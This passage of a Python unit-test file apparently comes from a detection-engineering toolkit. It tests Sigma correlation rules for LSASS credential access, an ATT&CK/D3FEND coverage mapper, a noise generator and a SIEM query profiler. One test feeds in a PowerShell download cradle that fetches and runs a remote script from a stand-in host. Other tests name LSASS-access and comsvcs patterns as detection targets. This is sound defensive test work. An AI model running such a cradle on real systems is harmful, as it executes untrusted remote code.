        result = self.ev.evaluate_rule(seq, rule_path=self.SCRIPTBLOCK_RULE, event_id=4104)
        self.assertTrue(result.matched)
        self.assertEqual(result.matched_event_indices, [0])

    def test_event_id_filter_excludes_other_families(self):
        self.gen.reset_timeline()
        seq = EventSequence(sequence_id="s")
        seq.add(self.gen.process_creation("C:\\a.exe", "a.exe -w hidden"))  # EID 1
        result = self.ev.evaluate_rule(seq, rule_path=self.SCRIPTBLOCK_RULE, event_id=4104)
        self.assertFalse(result.matched)

    def test_correlation_ordered_within_window_matches(self):
        rule = build_correlation_rule(
            name="lsass-theft",
            timespan_seconds=120,
            ordered=True,
            stages=[
                CorrelationStage(name="access", rule_path=self.PROCACCESS_RULE, event_id=10),
            ],
        )
        result = self.ev.evaluate_correlation(rule, self._cred_sequence())
        self.assertTrue(result.matched)
        self.assertTrue(result.within_window)

    def test_correlation_two_stage_chain_requires_distinct_events(self):
        # Two DISTINCT EID10 lsass-access events must satisfy a two-stage chain,
        # and each stage must consume a different event.
        gen = TelemetryGenerator(base_time="2026-09-03 14:00:00", dwell_seconds=10)
        seq = EventSequence(sequence_id="cred2")
        seq.add(gen.process_access("C:\\Temp\\a.exe", "C:\\Windows\\System32\\lsass.exe", "0x1010"))
        seq.add(gen.process_access("C:\\Temp\\b.exe", "C:\\Windows\\System32\\lsass.exe", "0x1410"))
        rule = build_correlation_rule(
            name="two-stage",
            timespan_seconds=120,
            ordered=True,
            stages=[
                CorrelationStage(name="access1", rule_path=self.PROCACCESS_RULE, event_id=10),
                CorrelationStage(name="access2", rule_path=self.PROCACCESS_RULE, event_id=10),
            ],
        )
        result = self.ev.evaluate_correlation(rule, seq)
        self.assertTrue(result.matched)
        self.assertEqual(len(result.selected_indices), 2)
        self.assertEqual(len(set(result.selected_indices)), 2)  # distinct events

    def test_two_stage_chain_fails_with_single_event(self):
        # A two-stage chain cannot be satisfied by a single candidate event.
        rule = build_correlation_rule(
            name="two-stage-single",
            timespan_seconds=120,
            ordered=True,
            stages=[
                CorrelationStage(name="access1", rule_path=self.PROCACCESS_RULE, event_id=10),
                CorrelationStage(name="access2", rule_path=self.PROCACCESS_RULE, event_id=10),
            ],
        )
        result = self.ev.evaluate_correlation(rule, self._cred_sequence())
        self.assertFalse(result.matched)

    def test_correlation_fails_outside_window(self):
        # Two script-block events 600s apart; a 60s window must reject the chain.
        gen = TelemetryGenerator(base_time="2026-09-03 14:00:00", dwell_seconds=600)
        seq = EventSequence(sequence_id="s")
        cradle = "IEX (New-Object Net.WebClient).DownloadString('https://x.stage.invalid/a.ps1')"
        seq.add(gen.script_block(cradle))
        seq.add(gen.script_block(cradle))
        rule = build_correlation_rule(
            name="tight-window",
            timespan_seconds=60,
            ordered=True,
            stages=[
                CorrelationStage(name="a", rule_path=self.SCRIPTBLOCK_RULE, event_id=4104),
                CorrelationStage(name="b", rule_path=self.SCRIPTBLOCK_RULE, event_id=4104),
            ],
        )
        result = self.ev.evaluate_correlation(rule, seq)
        self.assertFalse(result.matched)
        self.assertFalse(result.within_window)

    def test_correlation_fails_when_stage_has_no_candidate(self):
        self.gen.reset_timeline()
        seq = EventSequence(sequence_id="s")
        seq.add(self.gen.script_block("Write-Host 'benign'"))  # no download cradle
        rule = build_correlation_rule(
            name="no-candidate",
            stages=[CorrelationStage(name="a", rule_path=self.SCRIPTBLOCK_RULE, event_id=4104)],
        )
        result = self.ev.evaluate_correlation(rule, seq)
        self.assertFalse(result.matched)
        self.assertIn("no candidate", result.details.lower())

    def test_native_sigma_correlation_rule_parsing(self):
        corr_path = Path(__file__).resolve().parents[1] / "rules" / "sigma" / "correlation" / "correlation_lsass_dump.yml"
        self.assertTrue(corr_path.exists())
        rule = CorrelationRule.from_yaml(corr_path)
        self.assertEqual(rule.name, "Correlated LSASS Memory Access and Dump File Creation")
        self.assertEqual(rule.timespan_seconds, 120)
        self.assertTrue(rule.ordered)
        self.assertEqual(rule.group_by, ["Computer"])
        self.assertEqual(len(rule.stages), 2)
        self.assertEqual(rule.stages[0].name, "3b5d7e2c-1a9f-4d6b-9c30-7f6e5d4c3b21")
        self.assertEqual(rule.stages[1].name, "a1b2c3d4-e5f6-4a5b-8c9d-0e1f2a3b4c5d")


class GraphEngineTests(unittest.TestCase):
    """EPIC 2 — Verifies the DAG correlation state machine, branching, and scoring."""

    def setUp(self):
        self.engine = GraphEngine()

    def test_default_graph_is_acyclic_with_secondaries(self):
        graph = self.engine.build_default_graph()
        graph.validate_acyclic()  # must not raise
        self.assertEqual(graph.secondary_of("execution"), "execution_scriptblock")
        self.assertEqual(graph.secondary_of("credential_telemetry"), "credential_procaccess")
        self.assertEqual(len(graph.primary_order), 5)

    def test_cycle_detection_raises(self):
        graph = DetectionGraph(name="cyclic", start="a", objective="b")
        graph.add_node(GraphNode("a", "A", "T0001", "sigma", depth=0))
        graph.add_node(GraphNode("b", "B", "T0002", "sigma", depth=1))
        graph.add_edge(GraphEdge("a", "b", "primary"))
        graph.add_edge(GraphEdge("b", "a", "primary"))
        with self.assertRaises(ValueError):
            graph.validate_acyclic()

    def test_baseline_walk_intercepts_at_ingress(self):
        result = self.engine.walk(evasion_at=[])
        self.assertTrue(result.intercepted)
        self.assertTrue(result.contained)
        self.assertEqual(result.interception_node, "ingress")
        self.assertEqual(result.mttd_seconds, 0.0)
        self.assertGreater(result.depth_of_defense_score, 0.0)
        self.assertFalse(result.reached_objective)

    def test_secondary_paths_provide_defense_in_depth(self):
        result = self.engine.walk(evasion_at=["ingress", "execution", "credential_telemetry"])
        visit_by_id = {v.node_id: v for v in result.visits}
        # Primary execution + credential evaded, but their secondary paths must fire.
        self.assertFalse(visit_by_id["execution"].detected)
        self.assertTrue(visit_by_id["execution_scriptblock"].detected)
        self.assertFalse(visit_by_id["credential_telemetry"].detected)
        self.assertTrue(visit_by_id["credential_procaccess"].detected)
        self.assertTrue(result.contained)

    def test_uncontained_breach_when_no_layer_detects(self):
        # Minimal single-node graph with an evadable execution node and no secondary path.
        graph = DetectionGraph(name="thin", start="execution", objective="execution")
        graph.add_node(GraphNode("execution", "Execution", "T1204.002", "sigma", depth=1))
        graph.primary_order = ["execution"]
        result = self.engine.walk(graph=graph, evasion_at=["execution"])
        self.assertFalse(result.intercepted)
        self.assertFalse(result.contained)
        self.assertTrue(result.reached_objective)
        self.assertIsNone(result.mttd_seconds)
        self.assertEqual(result.depth_of_defense_score, 0.0)

    def test_run_walks_returns_all_iterations(self):
        results = self.engine.run_walks(iterations=6)
        self.assertEqual(len(results), 6)
        for res in results:
            self.assertTrue(0.0 <= res.depth_of_defense_score <= 1.0)
        # Serialization must round-trip.
        self.assertIn("depth_of_defense_score", results[0].to_dict())

    def test_multistage_correlation_chain_in_production_walk(self):
        result = self.engine.walk(evasion_at=["credential_telemetry"])
        visit_by_id = {v.node_id: v for v in result.visits}
        cred_visit = visit_by_id["credential_procaccess"]
        self.assertTrue(cred_visit.detected)
        self.assertIn("Correlated 2 stages", cred_visit.detail)


class MitreLayerExporterTests(unittest.TestCase):
    """EPIC 4 — Verifies ATT&CK Navigator layer compilation and scoring."""

    def setUp(self):
        self.exporter = MitreLayerExporter()

    def test_collect_rules_spans_all_sources(self):
        coverage = self.exporter.collect_rules()
        sources = {c.source for c in coverage}
        self.assertIn("sigma", sources)
        self.assertIn("sigma_correlation", sources)
        self.assertIn("yara", sources)

    def test_technique_extraction_from_tags(self):
        techs = MitreLayerExporter._extract_techniques(
            ["attack.execution", "attack.t1204.002", "attack.t1059.001", "not-a-tag"]
        )
        self.assertIn("T1204.002", techs)
        self.assertIn("T1059.001", techs)
        self.assertNotIn("execution", techs)

    def test_build_layer_schema(self):
        layer = self.exporter.build_layer()
        self.assertEqual(layer["domain"], "enterprise-attack")
        self.assertIn("versions", layer)
        self.assertGreater(len(layer["techniques"]), 0)
        for tech in layer["techniques"]:
            self.assertIn("techniqueID", tech)
            self.assertTrue(0 <= tech["score"] <= 100)

    def test_correlation_backed_techniques_score_higher(self):
        layer = self.exporter.build_layer()
        scored = {t["techniqueID"]: t["score"] for t in layer["techniques"]}
        # T1003.001 and T1059.001 are additionally covered by correlation rules.
        self.assertEqual(scored.get("T1003.001"), 95)
        self.assertEqual(scored.get("T1059.001"), 95)

    def test_export_writes_layer_file(self):
        import json
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "layer.json"
            path = self.exporter.export(out_path=out)
            self.assertTrue(path.exists())
            data = json.loads(path.read_text(encoding="utf-8"))
            self.assertIn("techniques", data)

    def test_layer_scores_are_deterministic_and_reproducible(self):
        # By default, layer scoring uses the pinned empirical baseline (0.712)
        # ensuring identical, reproducible outputs across machines regardless of mutable history.
        layer1 = self.exporter.build_layer()
        layer2 = self.exporter.build_layer()
        scored1 = {t["techniqueID"]: t["score"] for t in layer1["techniques"]}
        scored2 = {t["techniqueID"]: t["score"] for t in layer2["techniques"]}
        self.assertEqual(scored1, scored2)
        # Single-event rules blend baseline 75 with pinned 71 -> 73
        self.assertEqual(scored1.get("T1204.002"), 73)
        self.assertEqual(scored1.get("T1053.005"), 73)
        # Correlation-backed techniques stay at 95
        self.assertEqual(scored1.get("T1003.001"), 95)

    def test_layer_explicit_history_file_override(self):
        import json
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            custom_hist = Path(tmp) / "custom_hist.json"
            custom_hist.write_text(json.dumps({"final_resilience": 0.85}), encoding="utf-8")
            custom_exporter = MitreLayerExporter(history_file=custom_hist)
            layer = custom_exporter.build_layer()
            scored = {t["techniqueID"]: t["score"] for t in layer["techniques"]}
            # Blends 75 with 85 -> 80
            self.assertEqual(scored.get("T1204.002"), 80)

    def test_layer_pinned_resilience_none_uses_baseline(self):
        unpinned_exporter = MitreLayerExporter(pinned_resilience=None)
        layer = unpinned_exporter.build_layer()
        scored = {t["techniqueID"]: t["score"] for t in layer["techniques"]}
        # When unpinned and no history file, raw baseline 75 is preserved
        self.assertEqual(scored.get("T1204.002"), 75)


class ZeroFalsePositiveGateTests(unittest.TestCase):
    """EPIC 4 — Verifies the deterministic zero-false-positive validation gate."""

    def test_gate_passes_with_zero_false_positives(self):
        report = ZeroFalsePositiveGate().run()
        self.assertTrue(report.passed, f"Unexpected false positives: {report.false_positives}")
        self.assertEqual(report.false_positives, [])
        self.assertGreater(report.negatives_checked, 0)
        self.assertGreater(report.sigma_rules, 0)
        self.assertGreater(report.yara_rules, 0)

    def test_gate_reports_full_positive_coverage(self):
        report = ZeroFalsePositiveGate().run()
        self.assertGreater(report.positives_checked, 0)
        self.assertEqual(report.positives_detected, report.positives_checked)
        self.assertEqual(report.coverage_rate, 1.0)

    def test_markdown_contains_verdict_and_icd203(self):
        report = ZeroFalsePositiveGate().run()
        md = report.to_markdown()
        self.assertIn("Validation Gate", md)
        self.assertIn("ICD 203", md)
        self.assertIn("PASS", md)

    def test_injected_false_positive_fails_gate(self):
        report = GateReport()
        report.false_positives.append("benign_x.json triggered rule_y.yml")
        self.assertFalse(report.passed)
        self.assertIn("FAIL", report.to_markdown())


class EnterpriseNoiseGeneratorTests(unittest.TestCase):
    """EPIC 1 — Verifies benign background telemetry generation and safety validation."""

    def test_generates_requested_volume_all_benign(self):
        events = EnterpriseNoiseGenerator(seed=42).generate(250)
        self.assertEqual(len(events), 250)
        self.assertTrue(all(e.label == 0 for e in events))
        self.assertTrue(all(e.event.event_id == 1 for e in events))

    def test_generation_is_deterministic_for_a_seed(self):
        a = [e.event.fields["CommandLine"] for e in EnterpriseNoiseGenerator(seed=7).generate(60)]
        b = [e.event.fields["CommandLine"] for e in EnterpriseNoiseGenerator(seed=7).generate(60)]
        self.assertEqual(a, b)

    def test_different_seeds_diverge(self):
        a = [e.event.fields["CommandLine"] for e in EnterpriseNoiseGenerator(seed=1).generate(60)]
        b = [e.event.fields["CommandLine"] for e in EnterpriseNoiseGenerator(seed=2).generate(60)]
        self.assertNotEqual(a, b)

    def test_every_event_carries_a_known_profile(self):
        gen = EnterpriseNoiseGenerator(seed=11)
        known = set(gen.ROUTINE_PROFILES) | set(gen.AMBIGUOUS_PROFILES)
        for item in gen.generate(120):
            self.assertIn(item.profile, known)
            self.assertEqual(item.event.fields["NoiseProfile"], item.profile)

    def test_ambiguous_rate_bounds_are_enforced(self):
        with self.assertRaises(ValueError):
            EnterpriseNoiseGenerator(ambiguous_rate=1.5)
        with self.assertRaises(ValueError):
            EnterpriseNoiseGenerator(ambiguous_rate=-0.1)

    def test_negative_count_rejected(self):
        with self.assertRaises(ValueError):
            EnterpriseNoiseGenerator().generate(-1)

    def test_zero_ambiguous_rate_yields_only_routine_profiles(self):
        gen = EnterpriseNoiseGenerator(seed=5, ambiguous_rate=0.0)
        events = gen.generate(150)
        self.assertTrue(all(not e.ambiguous for e in events))
        self.assertTrue(all(e.profile in gen.ROUTINE_PROFILES for e in events))

    def test_widen_routine_profiles_and_weights(self):
        gen = EnterpriseNoiseGenerator()
        self.assertEqual(len(gen.ROUTINE_PROFILES), 16)
        self.assertEqual(len(gen.AMBIGUOUS_PROFILES), 2)
        self.assertAlmostEqual(sum(gen.ROUTINE_PROFILE_WEIGHTS.values()), 1.0)
        self.assertAlmostEqual(sum(gen.AMBIGUOUS_PROFILE_WEIGHTS.values()), 1.0)
        for p in gen.ROUTINE_PROFILES:
            self.assertIn(p, gen.ROUTINE_PROFILE_WEIGHTS)
        for p in gen.AMBIGUOUS_PROFILES:
            self.assertIn(p, gen.AMBIGUOUS_PROFILE_WEIGHTS)

    def test_volume_weighting_biases_routine_distribution(self):
        gen = EnterpriseNoiseGenerator(seed=42, ambiguous_rate=0.0)
        events = gen.generate(1000)
        counts = {}
        for e in events:
            counts[e.profile] = counts.get(e.profile, 0) + 1
        # Defender signature update (weight 0.20) should exceed low-weight admin queries (weight 0.01)
        self.assertGreater(counts.get("defender_signature_update", 0), counts.get("admin_activedirectory_query", 0))


class DetectionMetricsTests(unittest.TestCase):
    """EPIC 1 — Verifies confusion-matrix arithmetic and corpus evaluation semantics."""

    def test_metric_arithmetic(self):
        m = RuleMetrics(rule_name="r", true_positives=8, false_positives=2,
                        true_negatives=90, false_negatives=2)
        self.assertAlmostEqual(m.precision, 0.8)
        self.assertAlmostEqual(m.recall, 0.8)
        self.assertAlmostEqual(m.f1_score, 0.8)
        self.assertAlmostEqual(m.false_discovery_rate, 0.2)
        self.assertEqual(m.alerts, 10)

    def test_metrics_are_zero_division_safe(self):
        m = RuleMetrics(rule_name="empty")
        self.assertEqual(m.precision, 0.0)
        self.assertEqual(m.recall, 0.0)
        self.assertEqual(m.f1_score, 0.0)
        self.assertEqual(m.false_discovery_rate, 0.0)

    def test_malicious_fixtures_are_assigned_an_owning_rule(self):
        events = DetectionMetricsCalculator().load_malicious_fixtures()
        self.assertGreater(len(events), 0)
        self.assertTrue(all(e.label == 1 for e in events))
        self.assertTrue(
            all(e.target_rule.endswith(".yml") for e in events),
            "every positive fixture must declare the analytic it owns",
        )

    def test_routine_background_produces_no_false_positives(self):
        # With no ambiguous activity, well-tuned analytics must stay silent.
        report = run_benchmark(benign_count=300, ambiguous_rate=0.0, attack_variants=0)
        self.assertEqual(report.corpus_metrics.false_positives, 0)
        self.assertEqual(report.false_positive_rate(), 0.0)

    def test_ambiguous_activity_is_the_sole_false_positive_source(self):
        report = run_benchmark(benign_count=400, ambiguous_rate=0.25, attack_variants=0)
        self.assertGreater(report.corpus_metrics.false_positives, 0)
        generator = EnterpriseNoiseGenerator()
        for profile in report.corpus_metrics.false_positive_profiles:
            self.assertIn(profile, generator.AMBIGUOUS_PROFILES)

    def test_corpus_metrics_counted_per_event_not_pooled(self):
        report = run_benchmark(benign_count=200, ambiguous_rate=0.0, attack_variants=0)
        corpus = report.corpus_metrics
        # Pooling across 4 analytics would inflate TN to 4x the benign population.
        self.assertEqual(
            corpus.true_negatives + corpus.false_positives, report.benign_events
        )
        self.assertEqual(
            corpus.true_positives + corpus.false_negatives, report.malicious_events
        )

    def test_per_rule_recall_scored_only_over_owned_events(self):
        report = run_benchmark(benign_count=100, ambiguous_rate=0.0, attack_variants=0)
        for metric in report.per_rule:
            owned = metric.true_positives + metric.false_negatives
            self.assertLess(
                owned, report.malicious_events,
                "a rule must not be scored against fixtures it does not own",
            )
            self.assertGreater(owned, 0)

    def test_committed_fixtures_are_fully_recalled_by_their_owning_rule(self):
        report = run_benchmark(benign_count=50, ambiguous_rate=0.0, attack_variants=0)
        for metric in report.per_rule:
            self.assertEqual(
                metric.recall, 1.0,
                f"{metric.rule_name} failed to recall a fixture it owns",
            )

    def test_report_serialisation(self):
        report = run_benchmark(benign_count=80, ambiguous_rate=0.1, attack_variants=0)
        md = report.to_markdown()
        self.assertIn("Enterprise Telemetry Noise Floor Assessment", md)
        self.assertIn("Base-rate caveat", md)
        self.assertIn("Confidence.", md)
        self.assertIn("95% CI", md)
        data = json.loads(report.to_json())
        self.assertIn("corpus", data)
        self.assertIn("per_rule", data)
        self.assertIn("false_positive_rate", data)
        self.assertIn("false_positive_rate_ci_95", data)

    def test_false_positive_rate_ci_bounds(self):
        report = run_benchmark(benign_count=200, ambiguous_rate=0.05, attack_variants=0)
        p = report.false_positive_rate()
        ci_low, ci_high = report.false_positive_rate_ci(0.95)
        self.assertGreaterEqual(ci_low, 0.0)
        self.assertLessEqual(ci_high, 1.0)
        self.assertLessEqual(ci_low, p)
        self.assertGreaterEqual(ci_high, p)

        # Edge case: 0 benign events
        empty_report = NoiseFloorReport(
            total_events=0, benign_events=0, malicious_events=0, ambiguous_events=0
        )
        self.assertEqual(empty_report.false_positive_rate_ci(), (0.0, 0.0))


class SiemQueryProfilerTests(unittest.TestCase):
    """EPIC 3 — Verifies multi-SIEM query complexity analysis."""

    def setUp(self):
        self.profiler = SiemQueryProfiler()

    def test_profiles_every_rule_across_every_backend(self):
        report = self.profiler.profile_all()
        backends = {p.backend for p in report.profiles}
        self.assertEqual(backends, {"LogScale", "Splunk", "Lucene"})
        self.assertGreaterEqual(len(report.profiles), len(self.profiler.rule_paths()) * 3)

    def test_nesting_depth_measurement(self):
        self.assertEqual(SiemQueryProfiler._nesting_depth("a AND (b OR (c AND d))"), 2)
        self.assertEqual(SiemQueryProfiler._nesting_depth("flat query"), 0)

    def test_detects_leading_wildcards(self):
        profile = self.profiler.analyze("r", "Splunk", 'Image="*\\\\rundll32.exe"')
        self.assertGreaterEqual(profile.leading_wildcards, 1)
        self.assertTrue(any("leading-wildcard" in f for f in profile.findings))

    def test_detects_unanchored_and_case_insensitive_regex(self):
        profile = self.profiler.analyze("r", "LogScale", "CommandLine=/comsvcs/i")
        self.assertEqual(profile.unanchored_regexes, 1)
        self.assertEqual(profile.case_insensitive_ops, 1)

    def test_anchored_regex_is_not_flagged_unanchored(self):
        profile = self.profiler.analyze("r", "LogScale", "Image=/rundll32\\.exe$/i")
        self.assertEqual(profile.unanchored_regexes, 0)

    def test_impact_rating_bands(self):
        self.assertEqual(SiemQueryProfiler.rate_impact(10), "Low")
        self.assertEqual(SiemQueryProfiler.rate_impact(60), "Moderate")
        self.assertEqual(SiemQueryProfiler.rate_impact(120), "High")
        self.assertEqual(SiemQueryProfiler.rate_impact(500), "Costly")

    def test_clean_query_reports_no_costly_constructs(self):
        profile = self.profiler.analyze("r", "Splunk", 'EventCode=4688')
        self.assertEqual(profile.impact, "Low")
        self.assertIn("No costly search constructs detected.", profile.findings)

    def test_widest_rule_is_the_most_expensive(self):
        report = self.profiler.profile_all()
        worst = report.worst(1)[0]
        self.assertIn("ClickFix", worst.rule_name)
        self.assertEqual(worst.impact, "Costly")

    def test_report_serialisation(self):
        report = self.profiler.profile_all()
        md = report.to_markdown()
        self.assertIn("Multi-SIEM Query Complexity Assessment", md)
        self.assertIn("Confidence.", md)
        data = json.loads(report.to_json())
        self.assertIn("profiles", data)
        self.assertIn("worst", data)


class D3fendMapperTests(unittest.TestCase):
    """EPIC 4 — Verifies ATT&CK/D3FEND crosswalk, provenance, and collision detection."""

    def setUp(self):
        self.mapper = D3fendMapper()

    def test_briefing_mappings_are_present_and_correct(self):
        expected = {
            "T1566.001": {"D3-FAA"},
            "T1204.002": {"D3-PSA", "D3-SEA"},
            "T1059.001": {"D3-PSA", "D3-SEA"},
            "T1070.001": {"D3-LSA"},
            "T1003.001": {"D3-LSAP"},
            "T1053.005": {"D3-SJA"},
        }
        for technique, ids in expected.items():
            actual = {c.d3fend_id for c in ATTACK_TO_D3FEND[technique]}
            self.assertEqual(actual, ids, f"mapping drift for {technique}")

    def test_mapping_provenance_distinguishes_briefing_from_extended(self):
        self.assertEqual(mapping_source("T1566.001"), "briefing")
        self.assertEqual(mapping_source("T1059.003"), "verified")
        self.assertEqual(mapping_source("T9999"), "extended")
        for technique in BRIEFING_TECHNIQUES:
            self.assertEqual(mapping_source(technique), "briefing")

    def test_identifier_collision_is_detected(self):
        # In reconciled production mappings, zero collisions exist.
        collisions = D3fendMapper.find_id_collisions()
        self.assertEqual(len(collisions), 0, "Expected 0 collisions in reconciled ontology")

        # Verify collision detection algorithm works when a defect is introduced.
        from tools.swarm.d3fend_mapper import D3fendCountermeasure
        test_dict = {
            "T1": (D3fendCountermeasure("D3-X", "Name A", "Detect"),),
            "T2": (D3fendCountermeasure("D3-X", "Name B", "Harden"),),
        }
        by_id = {}
        for cms in test_dict.values():
            for cm in cms:
                by_id.setdefault(cm.d3fend_id, set()).add(cm.name)
        sim_collisions = [{"d3fend_id": k, "names": sorted(v)} for k, v in by_id.items() if len(v) > 1]
        self.assertEqual(len(sim_collisions), 1)
        self.assertEqual(sim_collisions[0]["d3fend_id"], "D3-X")

    def test_build_maps_every_covered_technique(self):
        report = self.mapper.build()
        self.assertGreater(len(report.mappings), 0)
        self.assertEqual(report.unmapped, [], "every covered technique should map")
        self.assertEqual(report.mapped_count, len(report.mappings))

    def test_lsass_hardening_is_the_sole_harden_tactic(self):
        report = self.mapper.build()
        by_tactic = report.countermeasures_by_tactic()
        self.assertIn("Harden", by_tactic)
        self.assertIn("Detect", by_tactic)
        self.assertTrue(any("Local Security Authority" in x for x in by_tactic["Harden"]))

    def test_markdown_reports_matrix_and_taxonomy_defect(self):
        md = self.mapper.build().to_markdown()
        self.assertIn("Dual-Layer Coverage Assessment", md)
        self.assertIn("Taxonomy status", md)
        self.assertIn("Zero identifier collisions detected", md)
        self.assertIn("Confidence.", md)

    def test_export_writes_dual_layer_json(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d3fend_layer.json"
            path = self.mapper.export(out_path=out)
            self.assertTrue(path.exists())
            data = json.loads(path.read_text(encoding="utf-8"))
            self.assertIn("mappings", data)
            self.assertIn("identifier_collisions", data)
            self.assertIn("countermeasures_by_tactic", data)


class SiemQueryProfilerTests(unittest.TestCase):
    """EPIC 3 — Validates multi-SIEM query compilation, static scoring, and empirical calibration."""

    def setUp(self):
        self.profiler = SiemQueryProfiler()

    def test_profile_all_generates_profiles_across_backends(self):
        report = self.profiler.profile_all()
        self.assertGreater(len(report.profiles), 0)
        backends = report.by_backend()
        self.assertIn("Splunk", backends)
        self.assertIn("Lucene", backends)
        self.assertIn("LogScale", backends)

        compiled_profiles = [p for p in report.profiles if p.query]
        self.assertGreater(len(compiled_profiles), 0)
        for p in compiled_profiles:
            self.assertTrue(p.rule_name)
            self.assertGreater(p.query_length, 0)
            self.assertGreater(p.tokens, 0)
            self.assertIn(p.impact, ("Low", "Moderate", "High", "Costly"))
            self.assertGreaterEqual(p.complexity_score, 0.0)

    def test_profiler_reporting_and_markdown(self):
        report = self.profiler.profile_all()
        worst = report.worst(limit=3)
        self.assertLessEqual(len(worst), 3)
        if len(worst) >= 2:
            self.assertGreaterEqual(worst[0].complexity_score, worst[1].complexity_score)

        md = report.to_markdown()
        self.assertIn("# Multi-SIEM Query Complexity Assessment", md)
        self.assertIn("Highest-cost queries", md)

        data = report.to_dict()
        self.assertIn("profiles", data)
        self.assertIn("backends", data)
        self.assertIn("worst", data)

    def test_benchmark_and_calibrate_empirical_timings(self):
        # Run small fast corpus for unit test
        report = self.profiler.benchmark_and_calibrate(corpus_size=100, repetitions=1)
        self.assertIn("empirical_calibration", report.to_dict())
        cal = report.empirical_calibration
        self.assertIn("pearson_correlation", cal)
        self.assertIn("mean_latency_ms", cal)
        self.assertIn("correlation_strength", cal)
        self.assertEqual(cal["corpus_size"], 100)

        # Check empirical_ms populated on profiled queries
        calibrated_profiles = [p for p in report.profiles if p.empirical_ms is not None]
        self.assertGreater(len(calibrated_profiles), 0)
        for cp in calibrated_profiles:
            self.assertGreaterEqual(cp.empirical_ms, 0.0)


class WorkbenchCanvasTests(unittest.TestCase):
    """EPIC 2 — Guards the visual workbench against drift from the Python engine.

    The canvas re-implements the walk in JavaScript. These tests fail if the
    engine's node set or scoring constants change without the workbench
    following, which is the failure mode that silently makes the visualiser lie.
    """

    @classmethod
    def setUpClass(cls):
        cls.path = Path(__file__).resolve().parents[1] / "swarm_workbench.html"
        cls.html = cls.path.read_text(encoding="utf-8")

    def test_workbench_exists(self):
        self.assertTrue(self.path.exists())

    def test_every_engine_node_is_rendered(self):
        graph = GraphEngine().build_default_graph()
        for node_id in graph.nodes:
            self.assertIn(node_id, self.html, f"workbench is missing engine node '{node_id}'")

    def test_secondary_branch_wiring_matches_engine(self):
        graph = GraphEngine().build_default_graph()
        self.assertIn(
            f'execution:"{graph.secondary_of("execution")}"'.replace('"', '"'),
            self.html.replace(" ", ""),
        )
        self.assertIn(graph.secondary_of("credential_telemetry"), self.html)

    def test_layer_weights_match_engine_constants(self):
        from tools.swarm.graph_engine import (
            _LAYER_WEIGHTS,
            _SECONDARY_DISCOUNT,
            _STAGE_DWELL_SECONDS,
        )
        weights = ", ".join(str(w) for w in _LAYER_WEIGHTS)
        self.assertIn(f"LAYER_WEIGHTS = [{weights}]", self.html)
        self.assertIn(f"SECONDARY_DISCOUNT = {_SECONDARY_DISCOUNT}", self.html)
        self.assertIn(f"STAGE_DWELL = {int(_STAGE_DWELL_SECONDS)}", self.html)

    def test_exposes_campaign_entry_point_and_views(self):
        self.assertIn("function runKillChainCampaign", self.html)
        self.assertIn("State Machine DAG", self.html)
        self.assertIn("Linear Pipeline", self.html)

    def test_reports_all_three_live_metrics(self):
        for label in ("Depth of Defense", "Mean Time to Detect", "Path to Objective"):
            self.assertIn(label, self.html)


if __name__ == "__main__":
    unittest.main()
